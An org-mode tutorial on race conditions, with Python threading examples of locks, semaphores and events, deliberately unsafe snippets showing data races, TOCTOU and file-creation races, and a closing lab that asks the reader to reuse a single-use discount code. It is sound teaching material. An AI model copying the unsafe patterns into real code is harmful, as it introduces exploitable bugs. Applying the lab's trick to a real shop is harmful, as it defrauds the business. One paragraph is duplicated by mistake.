#+title: Race Conditions
#+author: gabriel

* intro
A Race Condition occurs when multiple threads or processes simultaneously access and modify the same data or resource in a system. In this situation, threads or processes can unexpectedly affect each other's actions, leading to unforeseen and undesirable results.

For instance, in a banking application, a race condition can arise when two customers simultaneously try to send money to another bank customer.

In the image above, a single-use promotion code worth $20 is exploited three times due to a race condition vulnerability.

** importance and impacts
Race Condition vulnerabilities cause the system to behave in unexpected ways, leading to various security issues. These issues typically manifest as:

*data inconsistency* ->
when a piece of data is accessed or updated simultaneosuly by multiple threads, it can end up in an unexpected or inconsistent state.

*unauthorized access* ->
Poor synchronization between operations can lead to unauthorized users accessing sensitive data.

*service interruption* ->
Unexpected use of system resources can result in service disruptions and performance degradation.

These impacts can compromise both the reliability and security of the application. Therefore, understanding and preventing race condition vulnerabilities is crucial for developing secure and reliable software.

* concurrency and threading
Concurrency is the ability of a program to execute multiple tasks or processes simultaneously. This is usually achieved using multiple threads or processes.

Threads are lightweight processing units used to run different parts of a program in parallel.

Concurrency and threading are used to enhance the performance and efficiency of systems. However, if not managed correctly, these advantages can lead to serious vulnerabilities, especially during resource sharing.

** basics concepts

*** The role of timing ->
A race condition occurs in situations where operations need to be executed in a certain order and within a specific time interval. Proper timing between operations ensures that data is processed correctly.

*** Critical sections ->
A critical section is a part of code or data region that can only be accessed by one thread or process at a time. Managing critical sections is crucial to prevent race conditions.

*** synchronization ->
Synchronization involves techniques used to ensure that multiple threads or processes operate in a specific order and within a particular time frame.

*mutex (mutual exclusion)*  ->
 Prevents multiple threads from accessing the critical section simultaneously. When one thread enters the critical section, other threads wait.
#+begin_src python
import threading

balance = 100
lock = threading.Lock()

def withdraw(amount):
    global balance
    # Acquire the lock before entering the critical section
    with lock:
        if balance >= amount:
            balance -= amount
            print(f"Withdrawn {amount}, new balance: {balance}")
        else:
            print("Insufficient balance")

# Create multiple threads
threads = []
for _ in range(5):
    t = threading.Thread(target=withdraw, args=(50,))
    threads.append(t)
    t.start()

# Wait for all threads to complete
for t in threads:
    t.join()
#+end_src

*semaphore* ->
Allows a certain number of threads to access the critical section simultaneously.
#+begin_src python
import threading

# Semaphore allows up to 2 threads to enter the critical section
semaphore = threading.Semaphore(2)

def access_critical_section():
    # Acquire the semaphore before entering the critical section
    with semaphore:
        print("Accessing critical section")
        # Critical section code

# Create multiple threads
threads = []
for _ in range(5):
    t = threading.Thread(target=access_critical_section)
    threads.append(t)
    t.start()

# Wait for all threads to complete
for t in threads:
    t.join()
#+end_src

*event* ->
Used to send signals between threads. One thread waits for another thread to reach a certain condition.
#+begin_src python
import threading

event = threading.Event()

def wait_for_event():
    print("Waiting for event")
    # Wait until the event is set
    event.wait()
    print("Event occurred")

def set_event():
    print("Setting event")
    # Set the event to notify waiting threads
    event.set()

# Create and start threads
t1 = threading.Thread(target=wait_for_event)
t2 = threading.Thread(target=set_event)

t1.start()
t2.start()

# Wait for both threads to complete
t1.join()
t2.join()
#+end_src

These basic concepts and synchronization techniques are crucial for understanding and preventing race conditions. Mismanaged race conditions can compromise the security and correctness of systems.


Therefore, having in-depth knowledge of concurrency and threading, and employing appropriate synchronization techniques, is essential for developing secure and reliable software.

* types of race condition
Race condition vulnerabilities can manifest in various forms, each with its own distinct characteristics and consequences.

In this section, we will explore common types of race conditions: Data Race, Time-of-Check to Time-of-Use (TOCTOU), File System Race Conditions, and Memory Race Conditions.

*example* ->
Consider two threads incrementing a shared counter. Without proper synchronization, the counter's value may be different from what is expected.
#+begin_src python
import threading

counter = 0

def increment():
    global counter
    for _ in range(100000):
        counter += 1

threads = []
for _ in range(2):
    t = threading.Thread(target=increment)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print(f"Final counter value: {counter}")
#+end_src

In this example, the expected final value is 200000, but due to the data race, the result may vary.

** Time-of-check to Time-of-use (TOCTOU)
TOCTOU vulnerabilities occur when a resource is checked for a condition (time-of-check) and then used based on that condition (time-of-use).If the state of the resource changes between these two events, it can lead to security vulnerabilities.

*example* ->
Consider a system that checks whether a user has permission to perform a certain operation. If the user's permissions change between the check and the operation, unauthorized actions could be performed.
#+begin_src python
import threading
import time

class User:
    def __init__(self, user_id, is_admin):
        self.user_id = user_id
        self.is_admin = is_admin

    def set_admin(self, is_admin):
        self.is_admin = is_admin

def check_permission_and_execute(user):
    # Check if user is admin
    if user.is_admin:
        # Simulate delay
        time.sleep(1)
        # Execute admin task
        print(f"User {user.user_id} performed an admin task")
    else:
        print(f"User {user.user_id} is not authorized")

# Example usage
user = User(1, True)

# Create threads
threads = []
threads.append(threading.Thread(target=check_permission_and_execute, args=(user,)))

# Change user permission during the check
threads.append(threading.Thread(target=user.set_admin, args=(False,)))

# Start threads
for t in threads:
    t.start()

# Wait for all threads to complete
for t in threads:
    t.join()
#+end_src

This code demonstrates a TOCTOU vulnerability in a system that checks a user's permission and then performs an admin task.

** File system race conditions
This code demonstrates a TOCTOU vulnerability in a system that checks a user's permission and then performs an admin task.

*example* ->
Two processes attempting to create the same file can lead to inconsistent states or errors.
#+begin_src python
import os
import threading

def create_file(filepath):
    if not os.path.exists(filepath):
        with open(filepath, 'w') as file:
            file.write("Hello, world!")

threads = []
filepath = "/tmp/racefile"
for _ in range(2):
    t = threading.Thread(target=create_file, args=(filepath,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
#+end_src

In this example, both threads check for the file's existence and then attempt to create it, leading to a race condition.

** Memory race conditions
Memory Race Conditions occur when multiple threads access and modify shared memory without proper synchronization.

This can lead to lost updates, data corruption, and unpredictable behavior—even on CPython, where the Global Interpreter Lock (GIL) does not make compound read-modify-write operations atomic.

*example* ->
Two threads incrementing a shared counter without proper locking mechanisms.
#+begin_src python
import threading

counter = 0

def increment():
    global counter
    for _ in range(100_000):
        counter += 1  # Not atomic: read -> modify -> write

threads = []
for _ in range(2):
    t = threading.Thread(target=increment)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print(f"Final counter value: {counter}")
#+end_src

Without proper synchronization, the final counter value may be less than the expected 200000 due to lost updates.

* discount code lab
This lab contains a vulnerability that allows a discount code to exceed its redemption limit, allowing a ticket to be purchased at a lower cost.

Your starting balance is not enough to purchase the ticket. To complete the lab, use the discount code, which only has a one-time use limit, multiple times to make the ticket price affordable for your balance.

What is the order number that appears after ticket purchase?
